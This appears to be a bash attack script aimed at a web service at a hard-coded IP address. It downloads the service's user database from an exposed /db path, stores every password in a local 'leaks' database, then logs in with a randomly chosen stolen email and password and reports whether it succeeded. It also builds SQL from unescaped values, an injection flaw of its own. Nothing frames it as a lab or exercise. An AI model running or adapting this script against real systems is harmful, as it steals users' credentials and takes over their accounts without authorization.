#!/bin/bash
set -euo pipefail
IFS=$'\n\t'
server="http://94.103.95.24:5000"
printf "CREATE TABLE IF NOT EXISTS passwords(id INTEGER PRIMARY KEY, password TEXT UNIQUE);\n" | sqlite3 leaks

curl "$server/db" 2>/dev/null > db
leaks="$(printf "SELECT password FROM user;\n" | sqlite3 db)"
echo "$leaks" | while read leak; do
	printf "INSERT INTO passwords(password) VALUES('$leak')" | sqlite3 leaks 2>/dev/null || true
done
cred="$(printf ".mode list\nSELECT email, password FROM user ORDER BY RANDOM() LIMIT 1;\n" | sqlite3 db)"
email="$(echo "$cred" | tr "|" " " | awk '{print $1}')"
password="$(echo "$cred" | tr "|" " " | awk '{print $2}')"
output="$(curl --data "email=$email&password=$password" "$server/login" 2>/dev/null)"
if echo "$output" | grep profile >/dev/null; then
	echo "Success, used credentials: $email:$password"
else
	echo "Failure"
	exit 1
fi
rm db
